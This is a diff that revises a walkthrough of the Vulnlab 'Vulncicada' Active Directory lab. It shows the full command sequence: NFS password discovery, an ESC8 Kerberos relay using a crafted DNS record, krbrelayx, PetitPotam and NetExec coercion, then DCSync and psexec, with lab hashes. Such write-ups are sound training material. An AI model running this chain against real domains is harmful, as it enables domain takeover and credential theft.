@@ -1,17 +1,17 @@
 # Introduction
 
-
 <p align="center">
   <img src="img/Badge.png" alt="Description de l'image" width="300"/>
 </p>
 
 **Vulncicada** is a medium-rated Active Directory machine from **xct** on the **Vulnlab** platform, designed to model a realistic domain compromise scenario. This write-up details the full attack path from a black-box perspective.
 
-The initial foothold is gained from a password found in a public NFS share. This access is then leveraged to exploit a critical **ESC8** vulnerability in Active Directory Certificate Services (AD CS). The final compromise is achieved through a **Kerberos relay attack** targeting the insecure HTTP web enrollment interface, leading to a complete takeover of the Domain Controller.
+The initial foothold is gained from a password found in a public NFS share. This access is then leveraged to exploit a critical **ESC8** vulnerability in Active Directory Certificate Services (AD CS). The final compromise is achieved through a **Kerberos relay attack** targeting the insecure HTTP certificate web enrollment interface, leading to a complete takeover of the Domain Controller.
+
 # Walktrough
 ## Enumerating services
 
-I start by enumerating services on the host with the **nmap** tool.
+I start by enumerating services on the host with the `nmap` tool.
 
 ```bash
 $ nmap -sCV -T5 -oA nmap 10.129.234.48
@@ -96,14 +96,15 @@ Host script results:
 |_  start_date: N/A
 ```
 
-This Windows Machine is a domain controller as there are kerberos and LDAP services.
-An intereseting NFS share is also present and it is possible to connect to this host with winRM.
-The domain name `cicada.vl` and the DC FQDN is  `DC-JPQ225.cicada.vl`.
-I add these information in `/etc/hosts`.
+This Windows Machine is a domain controller as evidenced by running kerberos and LDAP services.
+An intereseting NFS share is also present, and it is possible to connect to this host via WinRM.
+The domain name is `cicada.vl` and the DC FQDN is  `DC-JPQ225.cicada.vl`.
+I add this information in `/etc/hosts`.
 
 ```bash
 # echo '10.129.234.48 cicada.vl DC-JPQ225.cicada.vl DC-JPQ225' >> /etc/hosts
 ```
+
 ## Discovering a password in a public NFS share
 
 Let's check if there is public NFS share.
@@ -124,7 +125,7 @@ $ sudo mkdir /mnt/vulncicada
 $ sudo mount 10.129.234.48:/profiles /mnt/vulncicada
 ```
 
-What do we have here ?
+What do we have here?
 
 ```bash
 $ ll
@@ -146,11 +147,11 @@ There is a picture in the Administrator folder.
 
 ![](img/Administrator.png)
 
-Also in the Rosie.Powell's folder.
+Also in the Rosie.Powell folder.
 
 ![](img/Marketing.png)
 
-It look likes Rosie can't remember her password. 
+It looks like Rosie can't remember her password. 
 I try this password with the `rosie.powell` account. 
 
 ```bash
@@ -171,6 +172,7 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powe
 ```
 
 `rosie.powell:Cicada123`
+
 ## Enumerating and discovering an ESC8 vulnerability
 
 With this account, I can enumerate the SMB shares.
@@ -191,8 +193,8 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRI
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
 ```
 
-Nothing interesting here but I see that there his an ADCS service in this domain.
-I use the **certipy** tool to enumerate ADCS but before this I need to request a TGT for the authentication.
+Nothing interesting stands out here, but I see that there his an ADCS service in this domain.
+I'll use the `certipy` tool to enumerate it, but before this I need to request a TGT for the authentication.
 
 ```bash
 # getTGT.py "cicada.vl"/"rosie.powell":'Cicada123'
@@ -201,7 +203,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in rosie.powell.ccache
 ```
 
-I set the KRB5CCNAME to the `rosie.powell` ccache and ask **certipy** to find vulnerable certificate template.
+I set the `KRB5CCNAME` environment variable to the `rosie.powell.ccache` and ask `certipy` to find vulnerable certificate templates.
 
 ```bash
 # KRB5CCNAME=rosie.powell.ccache certipy find -vulnerable -u 'rosie.powell' -p 'Cicada123' -target DC-JPQ225.cicada.vl -k -stdout 
@@ -260,18 +262,17 @@ There is an ESC8 vulnerability as Web Enrollment is enabled over http.
 
 ## Abusing ESC8 to recover the DC certificate
 
-It took me a lot of time to understand the mecanism to do a kerberos relay using an ESC8 vulnerability as I never did a NTLMrelay attack before.
+It took me a some time to understand the mechanism of a kerberos relay using an ESC8 vulnerability, as I had never performed a NTLM relay attack before.
+Reading this **Synacktiv** [article](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) an this **Hacker Reciped** [resource](https://www.thehacker.recipes/ad/movement/kerberos/relay) helped me a lot.
 
-Reading this Synaktyv [resource](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) helped me a lot.
-The objectiv here is to put a fake entry in the DNS records of the DC that point to our attacking machine and coerce the DC to make a request toward this entry. The DC request is then relayed toward the Web Enrollment service and this service return the DC certificate to the attacking machine. Any domain user can put DNS entry inside an Active Directory envinronment.
+The objectiv here is to add a malicious DNS records on the DC that points to our attacking machine and coerce the DC to authenticate to it. The DC's request is then relayed to the Certificate Web Enrollment service, which returns the DC's certificate to the attacking machine. By default, any domain user can put add DNS entries inside an Active Directory envinronment.
 
-I did many attempt untill find the good one. I was wrong at the beginning because my malicious DNS record was not well constructed.
-The request must be in this form:
-`[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`.
-So in my context, the record has to be:
+After several failed attempts, I realized my malicious DNS record was not constructed correctly. The hostname requires a specific format:
+`<ADCS_NETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`.
+In my context, the record is:
 `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`
 
-As explained, I add the malicious DNS record using the `rosie.powell` account with a kerberos authentication.
+As planned, I now add this DNS record using the `rosie.powell` account with Kerberos authentication.
 
 ```bash
 # KRB5CCNAME=rosie.powell.ccache dnstool.py -u "cicada.vl\\rosie.powell" -p Cicada123 -r 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' -k -d 10.10.14.169 -a add DC-JPQ225.cicada.vl --tcp -dns-ip 10.129.234.48
@@ -282,7 +283,7 @@ As explained, I add the malicious DNS record using the `rosie.powell` account wi
 [+] LDAP operation completed successfully
 ```
 
-I set up the krbrelay pointing to the ADCS HTTP service endpoint.
+I now set up my `krbrelayx`, pointing it directly at the ADCS HTTP service endpoint.
 
 ```
 # krbrelayx.py -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs -v 'DC-JPQ225$' --template DomainController
@@ -300,7 +301,7 @@ I set up the krbrelay pointing to the ADCS HTTP service endpoint.
 [*] Servers started, waiting for connections
 ```
 
-And the coerce a DC authentication with Petitpotam. Notice that I don't put my machine IP but the fake DNS record which point to my machine;
+Finally, I use `Petitpotam` to coerce authentication from the Domain Controller. Instead of using my attacker IP, I target the malicious DNS record I created earlier. This forces the DC to resolve the fake hostname and send its authentication request directly to my waiting relay.
 
 ```
 # KRB5CCNAME=rosie.powell.ccache petitpotam.py -d "cicada.vl" "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" "DC-JPQ225.cicada.vl" -k
@@ -327,8 +328,7 @@ Trying pipe lsarpc
 Something went wrong, check error status => Bind context rejected: invalid_checksum
 ```
 
-That does not worked, I don't know why PetitPotam return me an invalid_checksum error after a successful bind.
-I will try to coerce with NetExec.
+That didn't work. Petitpotam fails unexpectedly, returning an `invalid_checksum` error after a successful bind. Rather than debugging the Kerberos issue, I'll pivot and try coercing authentication with `NetExec` instead.
 
 ```bash
 # nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k -M coerce_plus -o LISTENER='DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'
@@ -344,7 +344,7 @@ COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
 COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
 ```
 
-And I receive back the DC certificate (I deleted the useless noise).
+Success. The coercion with NetExec works, and the relay immediately returns the DC's certificate. I've trimmed the output for clarity, showing only the captured certificate itself.
 
 ```bash
 [*] SMBD: Received connection from 10.129.234.48
@@ -359,7 +359,7 @@ And I receive back the DC certificate (I deleted the useless noise).
 
 ## Performing a DCSync with the DC account
 
-I can now authenticate as DC-JPQ225 using this certificate to recover his hash.
+With the certificate, I can now authenticate as the `DC-JPQ225$` machine account. My next step is to use this authentication to retrieve its NTLM hash.
 
 ```bash
 # certipy auth -pfx DC-JPQ225\$.pfx -dc-ip 10.129.234.48            
@@ -377,8 +377,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
 ```
 
-With the DC machine account, I can perform a DCSync attack over the domain.
-I use NetExec for that with a Kerberos authentication.
+Now that I have the DC's hash, I can perform a DCSync attack to dump all domain credentials. I'll use `NetExec` with Kerberos authentication to execute it.
 
 ```bash
 # nxc smb DC-JPQ225.cicada.vl -u 'DC-JPQ225' -H 'a65952c664e9cf5de60195626edbeee3' -k --ntds 
@@ -389,7 +388,7 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumping the NTDS, th
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
 ```
 
-The `administrator` hash is dumped.
+The DCSync attack is successful, and the `administrator` hash is dumped:
 `administrator:85a0da53871a9d56b6cd05deda3a5e87`
 
 ## Connecting to the DC as Administrator
@@ -403,7 +402,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in administrator.ccache
 ```
 
-Then I connect with Psexec using this TGT.
+Then I connect with `Psexec` using this TGT.
 
 ```
 # KRB5CCNAME=administrator.ccache psexec.py "cicada.vl"/"administrator"@"DC-JPQ225.cicada.vl" -k 
